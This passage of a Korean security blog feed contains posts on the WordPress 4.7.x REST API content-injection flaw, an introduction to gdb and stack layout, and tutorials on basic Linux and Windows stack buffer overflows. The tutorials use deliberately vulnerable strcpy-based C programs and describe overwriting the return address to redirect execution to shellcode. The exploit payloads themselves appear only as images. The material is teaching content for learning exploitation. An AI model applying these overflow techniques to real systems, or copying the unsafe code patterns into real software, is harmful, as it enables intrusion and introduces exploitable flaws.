-Privilege Escalation / Content Injection 취약점이 발생하는 핵심적인 원인은 존재하지 않는 게시물에 대한 검증 로직이 미흡하고, 수정하는 게시물을 식별하는 값에서 잘못된 형변환(Cascading)으로 그대로 수정이 되는 부분으로 사용자의 입력 값 검증에서 사소한 실수가 서비스에 많은 영향을 끼칠 수 있으며 세심한 입력 값 검증이 필요하다는 것을 알 수 있습니다.&lt;br /&gt;&lt;br /&gt;
-해당 취약점은 다음 버전인 4.7.2에서 바로 패치가 됐으며 update_item 함수의 형변환(Cascading) 라인이 삭제 되고, 추가적인 유형성 검사 로직이 추가된 것을 확인하였습니다.
-&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;References&lt;/strong&gt;
-&lt;br /&gt;
-https://www.twistlock.com/2017/06/08/wordpress-4-7-04-7-1/
-https://www.exploit-db.com/exploits/41223/
-https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>hackyu</name></author><category term="Posts" /><summary type="html">Privilege Escalation / Content Injection On Wordpress 4.7.0 ~ 4.7.1</summary></entry><entry><title type="html">web-0x00</title><link href="/web-0x00" rel="alternate" type="text/html" title="web-0x00" /><published>2019-02-24T07:22:00+09:00</published><updated>2019-02-24T07:22:00+09:00</updated><id>/web-0x00</id><content type="html" xml:base="/web-0x00">&lt;p&gt;0x00. 서문&lt;/p&gt;
-
-&lt;p&gt;안녕하세요 hackyu입니다.&lt;/p&gt;
-
-&lt;p&gt;처음 외부에 공개적으로 포스팅되는 글을 작성하게 되어 매우 설레기도 하고, 조심스러운 부분이 있네요.&lt;/p&gt;
-
-&lt;p&gt;미리 포스팅된 리눅스, 윈도우 환경에서의 시스템 해킹 관련 글과 다르게 제가 앞으로 다룰 내용은 웹 해킹 내용으로 포스팅을 하려고 합니다.&lt;/p&gt;
-
-&lt;p&gt;이미 OWASP Top 10과 같은 웹 해킹 공격기법에 대해 정리된 글들이 많기에 조금은 다르게 실제 CMS(Content Management System) 환경에서 발견된 취약점을 대상으로 1Day Test를 진행하면서 취약점에 대한 분석 내용을 소개하려고 합니다.&lt;/p&gt;
-
-&lt;p&gt;흔히들 기존에 발견되어진 취약점이 아닌 새롭게 발견된 취약점을 0Day(Zero Day)취약점이라고 불리우는데, 해당 취약점에 대한 패치가 된 취약점을 1Day 취약점이라고 생각하시면 될 것 같습니다.
-CMS(Content Management System)가 무엇인가 하는 분들이 계실 텐데요. 간략하게 흔히들 Wordpress, Gnuboard, Drupal과 같은 Framework 입니다.&lt;/p&gt;
-
-&lt;p&gt;처음 CMS 1Day Test 포스팅의 서문은 여기서 마치고, 앞으로 열심히하여 쉽고, 잘 정리가 된 1Day Test 내용을 포스팅 하도록 하겠습니다.&lt;/p&gt;</content><author><name>hackyu</name></author><category term="Posts" /><summary type="html">0x00. 서문</summary></entry><entry><title type="html">linux_0x02</title><link href="/linux_0x02" rel="alternate" type="text/html" title="linux_0x02" /><published>2019-02-22T19:18:00+09:00</published><updated>2019-02-22T19:18:00+09:00</updated><id>/linux_0x02</id><content type="html" xml:base="/linux_0x02">&lt;h2 id=&quot;0x02---buffer-overflow-맛보기&quot;&gt;0x02 - Buffer Overflow 맛보기&lt;/h2&gt;
-
-&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;임돠.&lt;/p&gt;
-
-&lt;p&gt;오늘은 저번 시간에 다룬 내용에 이어서 기본적인 BOF 와 추가적으로 알아야 할 내용을 다루도록 하겠습니다.&lt;/p&gt;
-
-&lt;p&gt;먼저 이번 시간부터는 직접 &lt;strong&gt;gdb&lt;/strong&gt;를 이용해서 여기저기 들쑤실 계획인데 그럴려면 &lt;strong&gt;gdb&lt;/strong&gt; 조작법을 먼저 알아야 겠죠. 마찬가지로 필요한 명령어들 먼저 알아 보도록 하겠습니다. (개취)&lt;/p&gt;
-
-&lt;h1 id=&quot;gdb&quot;&gt;gdb&lt;/h1&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-1.png&quot; alt=&quot;[그림 2-1]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-2.png&quot; alt=&quot;[그림 2-2]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;&lt;strong&gt;그누 디버거&lt;/strong&gt; 라는 이름으로 아주 옛부터 널리 쓰이던 디버거 입니다. 앞으로 진행될 내용에서는 이정도 명령어만 알아도 크게 무리 없이 기본적인 분석은 가능하다고 생각 됩니다. &lt;strong&gt;gdb&lt;/strong&gt;는 다양한 명령어가 있으니 상황에 맞게, 취향에 맞게 추가적으로 더 찾아서 쓰시면 되겠습니다. 참고로 괄호안의 문자는 약어입니다.&lt;/p&gt;
-
-&lt;p&gt;그런데 막상 &lt;strong&gt;gdb&lt;/strong&gt;로 이것저것 뒤져보면서 메모리의 주소값을 보다보면 이상하게 뒤죽박죽 매핑된듯 한 느낌을 받습니다.&lt;/p&gt;
-
-&lt;p&gt;이를테면 분명 0xABCD1234의 값이 메모리에는 34 12 CD AB와 같이 보기 불편하게 박혀있습니다. 왜 저럴까요?&lt;/p&gt;
-
-&lt;h1 id=&quot;리틀엔디안빅엔디안&quot;&gt;리틀엔디안/빅엔디안&lt;/h1&gt;
-
-&lt;p&gt;왜 저렇게 보기 귀찮게, 어렵게 저장하고 있냐하면 일종의 메모리 저장 방식 중 하나라고 이해 하시면 됩니다. 특정 데이터를 메모리에 저장할 때 &lt;strong&gt;바이트 단위&lt;/strong&gt;로 저장을 하게 됩니다. 이 때 CPU의 아키텍쳐에 따라 이 바이트의 저장 순서에 따라 &lt;strong&gt;리틀엔디안&lt;/strong&gt;, &lt;strong&gt;빅엔디안&lt;/strong&gt; 또는 두 방식 모두 지원하거나 모두 지원하지 않는 미들엔디안이 있습니다. 여기서는 미들엔디안은 제외 하고 각각의 예를 들어 보도록 하겠습니다. (4바이트)&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-3.png&quot; alt=&quot;[그림 2-3]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;보시는 것처럼 &lt;strong&gt;빅엔디안&lt;/strong&gt;의 경우는 우리가 평소 글을 쓰는 방향과 동일하게 저장됩니다.
-반면 &lt;strong&gt;리틀엔디안&lt;/strong&gt;의 경우 이상한 모습이죠. 빅엔디안과는 다르게 데이터가 역순으로 저장 됩니다.&lt;/p&gt;
-
-&lt;p&gt;왜 컴퓨터는 이런 짓 거리를 할까요? CPU에는 &lt;strong&gt;ALU&lt;/strong&gt;라는 산술/연산을 담당하는 친구가 껴있습니다. 이 친구는 메모리를 읽을 때 &lt;strong&gt;낮은 주소&lt;/strong&gt;에서 &lt;strong&gt;높은 주소&lt;/strong&gt;로 읽어들이고 그래야 작업 속도가 빠른 친구입니다. 쉽게 말해 작업 처리를 더 효율적으로 하기위해 설계된 방식입니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;빅엔디안&lt;/strong&gt;의 경우 주로 네트워크 상에서 사용된다 생각하시면 되겠습니다.
-우리 주변에 있는 대부분의 데스크톱은 &lt;strong&gt;리틀엔디안&lt;/strong&gt;을 사용하며 Intel 계열의 프로세서인 리눅스, 윈도우가 이에 해당 됩니다. 앞으로 &lt;strong&gt;리틀엔디안&lt;/strong&gt;을 자주 보게 될겁니다.&lt;/p&gt;
-
-&lt;p&gt;추가적로 ARM 프로세서들은 빅엔디안과 리틀엔디안을 선택하여 사용 가능합니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;함수-프롤로그에필로그&quot;&gt;함수 프롤로그/에필로그&lt;/h1&gt;
-
-&lt;p&gt;코드를 몇 번 분석하다 보면 공통적인 모습을 찾을 수 있습니다. (못 보셨을수도 있습니다.)바로 함수의 시작과 끝이 비슷한 모습을 취하고 있다는 것이죠. 왜일까요?&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;함수 호출&lt;/strong&gt; 시 동작 방식은 다음과 같이 요약해 봤습니다.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;함수가 사용한 인자를 스택에 저장&lt;/li&gt;
-  &lt;li&gt;eip값 즉, 함수 호출후 돌아올 주소를 스택(&lt;strong&gt;ret&lt;/strong&gt;)에 저장 후 함수 시작 지점으로 점프(함수 호출)&lt;/li&gt;
-  &lt;li&gt;함수 내에서 사용할 스택 프레임을 설정(&lt;strong&gt;프롤로그&lt;/strong&gt;)&lt;/li&gt;
-  &lt;li&gt;함수의 내용 수행&lt;/li&gt;
-  &lt;li&gt;수행 후 처음 호출한 지점으로 돌아가기 위해 스택을 복원 (&lt;strong&gt;에필로그&lt;/strong&gt;)&lt;/li&gt;
-  &lt;li&gt;호출한 지점의 다음 라인으로 점프 또는 스택에 저장 된 eip값으로 복귀(다음 함수 수행)&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;즉, 함수를 수행하기 위한 준비 과정을 &lt;strong&gt;프롤로그&lt;/strong&gt;라 하며 함수 수행을 마무리하는 과정을 &lt;strong&gt;에필로그&lt;/strong&gt;라 이해하면 되겠습니다. 그사이에 실제 코드가 동작 하게는 명령어들이 자리 잡게 됩니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1   #include &amp;lt;stdio.h&amp;gt;
-2
-3   main(){
-4    //프롤로그
-5     int num1=1;
-6     int num2=3;
-7
-8     sum(num1,num2); /*sum() 종료후 복귀할 주소를 ret에 저장 
-					및 인자값을 스택에 저장 후 sum()으로 점프*/
-9          
-10     return 0;
-11   //에필로그
-12  }
-13
-14  sum(int num1, int num2){
-15   //프롤로그       
-16    int sum1;
-17       
-18 		  sum1 = num1 + num2;
-19
-20    return sum1;
-21   //에필로그
-22  }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위에 코드에서 프롤로그와 에필로그의 대략적인 위치를 보여줍니다. 또한 sum 함수 호출 시의 어떤 동작을 수행 하는지도 간략하게 확인 가능 합니다. 또한 어셉블리어로는 다음과 같이 표현됩니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 프롤로그
-1  push    ebp         # 이전 함수의 베이스 주소를 저장(sfp)
-2  mov     ebp, esp    # 새로운 스택 프레임 생성
-
-.......생략........
-
-// 에필로그
-3  mov     esp, ebp    # 베이스 주소를 이전의 스택으로 복구
-4  pop     ebp         # 베이스 주소 복구
-5  pop     eip         # eip를 ret에 저장
-6  jmp     eip         # 함수 종료 후 다음 명령으로 이동
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;main() 함수 시작 시 프롤로그인 1~2라인이 먼저 수행 됩니다. 그 다음 작성된 코드가 수행 되고 return 값 반환 후에 에필로그 3~6라인이 수행됩니다.&lt;/p&gt;
-
-&lt;p&gt;이 때 3~4 라인은 &lt;strong&gt;leave&lt;/strong&gt;, 5~6라인은 &lt;strong&gt;ret&lt;/strong&gt;라고 표현하기도 합니다.&lt;/p&gt;
-
-&lt;p&gt;간단히 정리 하자면, 함수의 시작점은 프롤로그, 끝점은 에필로그라 생각하시면 됩니다. 그 과정에서 길을 잃지 않기 위해서 위와 같이 ebp와 esp의 조작 과정들을 거치는 것이죠.&lt;/p&gt;
-
-&lt;p&gt;그럼 sfp는 무엇이고, ret는 무엇일까요?&lt;/p&gt;
-
-&lt;h1 id=&quot;bof-맛보기&quot;&gt;BOF 맛보기&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;sfp&lt;/strong&gt;와 &lt;strong&gt;ret&lt;/strong&gt;는 &lt;strong&gt;BOF 맛보기&lt;/strong&gt;와 함께 알아보도록 하겠습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bof1.c
-1   #include &amp;lt;stdio.h&amp;gt;
-2   
-3   int main(int argc, char *argv[]){
-4
-5      char buf[20];
-6      
-7      strcpy(buf, argv[1]);
-8      printf(&quot;%s\n&quot;, buf);
-9
-10     return 0;
-11  }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;버퍼 20을 할당하고 사용자에게 입력값을 받아 버퍼에 저장하는 코드가 보입니다.
-메모리에서는 함수가 실행 되면 &lt;strong&gt;4byte 단위&lt;/strong&gt;로 메모리에 버퍼 공간을 확보합니다. 사용자가 임의의 값(AAAA)을 입력했을 때 메모리의 모습은 이런 모습입니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-4.png&quot; alt=&quot;[그림 2-4]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;&lt;strong&gt;sfp&lt;/strong&gt;(save frame pointer)는 ebp를 바로 전에 호출한 ebp 주소를 저장해두고 나중에 함수 리턴전에 이 값을 참조하여 ebp를 복구합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;ret&lt;/strong&gt;에서는 함수 종료 후 복귀할 주소가 저장됩니다. 제일 뒤에 있는 파라미터는 필요한 변수의 값들이 들어서게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;여기서 코드 실행 시 일반적으로 사용자가 입력한 값은 버퍼20 영역에 들어가도록 설계가 되었습니다. 하지만 취약한 함수인 &lt;strong&gt;scanf&lt;/strong&gt;, &lt;strong&gt;strcpy&lt;/strong&gt; 등(str…..)을 사용하며, 사용자로부터 &lt;strong&gt;입력받은 값의 길이를 검증하지 않는 경우&lt;/strong&gt; 버퍼를 넘어서 sfp, ret의 영역에 까지 입력값이 저장 됩니다. 이 때 ret영역에 공격 쉘코드로 덮어버리면 공격자의 코드까지 동작되는 것이죠. 예를 들어 “AAAA”*64를 입력 해서 A를 256개를 입력 받았다면 다음과 같이 할당 받은 20byte의 버퍼 공간을 넘어서 저장될 것입니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-5.png&quot; alt=&quot;[그림 2-5]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;대충 감이 오시나요??
-주어진 버퍼의 길이 이상의 데이터를 입력하여 sfp, ret 영역까지 덮고 함수 종료 후 ret영역의 코드가 실행되어 공격자가 원하는 행위를 하도록 하는 공격인 것이죠. 실제로는 아래와 같이 공격 페이로드를 작성해서 BOF를 시도 합니다. 우리가 노리는건 256바이트 무의미한 덩어리가 아닙니다.(물론 dos 공격의 개념으로 사용 가능합니다.) 우리는 ret 영역에 shell을 따낼수있는 코드를 구성하는 것입니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-6.png&quot; alt=&quot;[그림 2-6]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;이제부터는 앞에서 봤던 코드를 대상으로 &lt;strong&gt;BOF&lt;/strong&gt; 시도해 봅시다. 우리 목표는 위의 그림과 마찬가지로 ret 영역에 HACK를 넣는겁니다. 주의 할 점은 코드내에서 버퍼를 20byte를 주었다 해도 실제 메모리상에서는 그 이상을 할당할 수도 있습니다. 반드시 gdb를 통해서 실제 할당 공간을 확인해야 합니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-7.png&quot; alt=&quot;[그림 2-7]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위에서 봤던 bof.c 코드를 작성 후 컴파일 해야 합니다. 컴파일된 바이너리 파일을 실행하여 정상적으로 동작이 되는지까지 확인 합시다. 동작은 아래와 같습니다.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;bof.c의 7번 라인에서 입력 받은 argv의 값을 &lt;strong&gt;strcpy&lt;/strong&gt; 함수를 통하여 buf에 복사&lt;/li&gt;
-  &lt;li&gt;bof.c의 8번 라인에서 buf에 복사된 입력값을 &lt;strong&gt;printf&lt;/strong&gt; 함수를 통하여 출력&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;정상적으로 동작되는 것을 확인 했습니다. 이제 gdb를 사용해서 바이너리 파일 bof1을 뜯어 보도록 합시다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-8.png&quot; alt=&quot;[그림 2-8]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;gdb로 bof1 바이너리 파일을 실행 시키고 &lt;strong&gt;disassemble&lt;/strong&gt; 명령어를 통해 main 함수를 어셈블리어로 출력 해줍니다. 하지만 코드를 읽기에 익숙하지 않은 형태입니다. gdb는 기본적으로 at&amp;amp;t 형식을 표현합니다. 이걸 intel 형식으로 바꿔서 우리가 읽기 편하게 바꿔 봅시다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-9.png&quot; alt=&quot;[그림 2-9]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;보기 편한 형태로 보시면 됩니다. 참고로 다시 at&amp;amp;t 형식으로 바꾸는 방법은 &lt;strong&gt;set disassembly-flavor att&lt;/strong&gt; 입니다. 계속 진행 해보겠습니다. 위에서 짚고 넘어갔던 프롤로그/에필로그와 전 편에서 다뤘던 어셈블리 명령어, 레지스터 등이 보입니다.&lt;/p&gt;
-
-&lt;p&gt;여기서 중요시 봐야할 라인은 버퍼의 크기를 정하는 &lt;strong&gt;main+3&lt;/strong&gt; 라인입니다. 프롤로그 후에 필요한 버퍼 크기만큼 할당하여 esp를 쭉 밀어 넣는다고 생각하시면 됩니다. 하지만 앞서 말했듯이 우린 20byte를 지정 했지만 실제로는 0x28 즉, 40byte를 할당 받았습니다. 이 유는 컴파일러마다의 차이라고 하시면 되겠습니다. 중요한 것은 할당받은 버퍼공간을 꼭 항상 확인해야 한다는 겁니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-10.png&quot; alt=&quot;[그림 2-10]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;지금까지 확인 된 내용은 위의 그림과 같습니다. 40byte의 버퍼와 sfp, ret 각 4byte 입니다. 그럼 이제 버퍼에 값이 정말 들어가는지 봐야겠습니다. main+31 라인은 strcpy 함수를 호출하는 라인입니다.  우리가 입력값이 저장되어있는 argv의 값을 buf에 복사하기 전입니다. 그 다음 라인 36,39 라인은 esp를 정리하는 라인이며 42라인에서 ebp를 eax에 저장하는 과정을 확인 가능합니다. 버퍼에 입력한 값들이 들어 가는지 확인해 봅시다.&lt;/p&gt;
-
-&lt;p&gt;잊지 말아야 하는 점은 버퍼 다음 sfp 다음 ret 영역이 자리 잡는 다는 겁니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-11.png&quot; alt=&quot;[그림 2-11]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위의 사진과 같이 브레이크 포인트를 main+42 지점에 설정 해줍시다. 그리고 run 명령어를 통해서 bof1이 실행 되며, python의 -c 옵션과 print함수를 사용하여 입력값을 전달됩니다. 미리 설정한 브레이크 포인트에서 멈췄다는걸 보여줍니다. 이제 esp를 기준으로 특정 크기만큼의 메모리 상태를 확인하여 버퍼 구역에 값이 똑바로 들어갔는지 확인합니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-12.png&quot; alt=&quot;[그림 2-12]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;검정색으로 덮혀있는 40byte가 버퍼 구역임을 확인할 수 있습니다. 버퍼 다음엔 sfp 구역이며 이어서 ret 구역이 자리잡는다고 알려 드렸습니다. 다음의 사진을 통해 ebp의 위치를 확인 하여 붉은 박스가 sfp 영역인지 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-13.png&quot; alt=&quot;[그림 2-13]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;ebp의 위치와 저장되있는 값을 확인해보니 붉은 박스가 sfp 영역임을 확인 헀습니다. 그럼 초록 박스는 ret구역이라는 것을 알 수 있습니다. 계속 해서 continue 명령을 사용해 나머지 부분을 실행 시킵니다. 입력한 “A” 40byte가 똑바로 출력 됩니다. 그렇다면 추가로 4byte를 입력하여 sfp구역의 EBP값을 넘어간 후 추가적으로 4byte를 입력 한다면 ret 위치에 저장 될 것입니다. 바로 확인 해보겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-14.png&quot; alt=&quot;[그림 2-14]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;sfp 위치에 BBBB의 아스키 값이 저장 되있고, 우리의 타겟이었던 ret 구역(초록 박스)에 “HACK” 문자의 아스키 값이 잘 저장 되어있네요. 이로써 ret 구역에 값이 저장 되며 이를 악용해 쉘코드를 저 위치에 저장 하면 됩니다.&lt;/p&gt;
-
-&lt;p&gt;즉, 40byte(buffer) + 4byte(sfp)의 잉여 데이터를 채우고 ret에 공격 쉘코드를 읽을수 있는 주소값으로 바꾸면 함수 종료 후 ret에 저장된 주소값을 참조하며 쉘코드가 실행 됩니다.&lt;/p&gt;
-
-&lt;p&gt;지금 까지는 맛보기 BOF였습니다. 이것 저것 한 번에 알려 드려서 양이 많아졌네요. 공부 하면서 중구난방으로 있던 내용들을 무리해서라고 꽉꽉 채웠습니다. 최대한 간단하게…&lt;/p&gt;
-
-&lt;p&gt;다음 시간에는 직접 쉘코드를 활용해서 실제 쉘을 따보겠습니다.
-갈 길이 멉니다….천천히 탄탄히 갑시다.&lt;/p&gt;
-
-&lt;p&gt;감사합니다.&lt;/p&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">0x02 - Buffer Overflow 맛보기</summary></entry><entry><title type="html">windows-0x03</title><link href="/windows-0x03" rel="alternate" type="text/html" title="windows-0x03" /><published>2019-02-18T19:18:00+09:00</published><updated>2019-02-18T19:18:00+09:00</updated><id>/windows-0x03</id><content type="html" xml:base="/windows-0x03">&lt;h1 id=&quot;0x03-basic-bof&quot;&gt;0x03 Basic Bof&lt;/h1&gt;
-
-&lt;h5 id=&quot;what-is-the-buffer-overflow&quot;&gt;What is the Buffer Overflow?&lt;/h5&gt;
-
-&lt;p&gt;Buffer Overflow(이하 BOF)는 데이터의 저장 또는 보관을 위해 주어진 메모리 공간의 크기보다 더 많은 값을 입력해 인접 메모리의 값을 변조할 수 있는 공격 기법입니다. 공격자들이 BOF를 이용해서 주로 하는 일은 변수의 값을 변조하는 것과 RET를 변조해서 프로그램의 흐름을 조작하는 것입니다.&lt;/p&gt;
-
-&lt;p&gt;이 취약점은 왜 발생할까요?&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;strcpy, gets 등의 입력 값 길이를 체크하지 않는 취약한 문자열 함수의 사용&lt;/li&gt;
-  &lt;li&gt;길이 값 검증을 하지 않은 취약한 프로그램 설계&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;BOF는 흔히 위의 두 가지 이유로 발생합니다. 그렇다면 이 취약점이 발생하지 않게 하려면 어떻게 하면 될까요?
-입력 값 길이를 체크하는 안전한 문자열 함수를 사용하면 되겠죠? 물론 이것도 중요하지만 안전한 함수의 사용만으로는 이 공격을 100% 막을 수는 없습니다. 안전한 함수로 문자열 길이 500만큼 받도록 해놓더라도 버퍼의 크기가 300이면 BOF가 일어날 수 있습니다. 그렇기 때문에 안전한 문자열 함수의 사용과 더불어 &lt;strong&gt;안전한 프로그램 설계&lt;/strong&gt;도 뒷받침되어야 합니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;direct-eip-overwrite&quot;&gt;Direct EIP Overwrite&lt;/h5&gt;
-
-&lt;p&gt;아래 소스코드를 가지고 가장 기초적인 BOF를 다루어보도록 하겠습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-
-#pragma warning (disable:4996)
-#define _CRT_SECURE_NO_WARNINGS
-
-int main(int argc, char* argv[]) {
-
-    char content_buffer[1000];
-    char display_buffer[300];
-    FILE *f = fopen(argv[1], &quot;rb&quot;);
-
-    fgets(content_buffer, 1000, f);
-    strcpy(display_buffer,content_buffer);
-
-    printf(&quot;%s\n&quot;, display_buffer);
-
-    fclose(f);
-    return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;fgets로 길이 1000만큼 파일을 읽어와서 content_buffer에 값을 저장하고, 다시 content_buffer에서 display_buffer로 값을 복사한 후 출력해주는 프로그램입니다. 여기서 문제는 strcpy로 content_buffer에서 display_buffer로 값을 복사한다는 것이죠.&lt;/p&gt;
-
-&lt;p&gt;본격적으로 공격을 시작해보도록 하겠습니다.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Buffer 시작 주소에서 RET까지의 거리 알아내기&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Buffer 시작 위치에서 값을 얼마나 넣어야 RET를 변조할 수 있는지 알아야 공격이 가능하겠죠?&lt;/p&gt;
-
-&lt;p&gt;지금은 거리를 모르니 다음과 같이 간단하게 “A” 100개만 넣어서 분석을 해보겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x03_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-1]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x03_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-2]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;Buffer 시작 위치가 EBP-12C인 것을 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;SFP도 덮어줘야 하니까 거리는 304가 되겠네요.(12C = 300)&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Exploit 작성하기&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;메모리 보호기법이 적용되지 않은 프로그램이기 때문에 RET를 Shellcode가 있는 곳의 주소로 변조하기만 하면 됩니다.&lt;/p&gt;
-
-&lt;p&gt;그럼 Payload는 아래 코드와 같이 Nop과 Shellcode를 합쳐서 304만큼 만들어주고, RET는 Shellcode 시작 전 Nop이 있는 위치로 지정하면 되겠네요.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x03_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-3]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;immunity debugger로 프로그램 흐름을 한 번 살펴보겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x03_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-4]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;Strcpy가 동작이 완료된 후, RET가 Buffer 시작 주소로 잘 변조되었네요.&lt;/p&gt;
-
-&lt;p&gt;Main 함수의 RET를 변조했기 때문에 실제로 Shellcode가 실행되는 시점은 Main 함수의 에필로그 과정이 진행된 다음입니다.&lt;/p&gt;
-
-&lt;p&gt;에필로그 과정의 마지막에서 변조된 RET 주소로 프로그램의 흐름이 바뀌면 다음과 같이 Shellcode를 만나러 갑니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x03_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-5]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;공격 결과 확인&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x03_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-6]&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-
